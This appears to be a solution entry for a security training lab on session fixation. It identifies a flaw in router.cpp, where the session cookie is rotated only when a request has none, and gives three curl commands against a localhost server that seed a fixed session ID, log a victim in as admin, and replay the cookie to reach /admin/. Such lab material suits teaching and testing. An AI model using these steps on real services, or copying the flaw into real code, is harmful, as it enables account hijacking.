# Solution — 04 · Session Fixation

**Code**: `router.cpp` → cookie is only rotated when the request had none.

1. Attacker seeds the session:
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/
   ```
2. Victim authenticates (still using the same cookie):
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" \
        -H "Authorization: Basic YWRtaW46YWRtaW4=" \
        http://127.0.0.1:8081/admin/
   ```
3. Attacker replays:
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/admin/
   ```
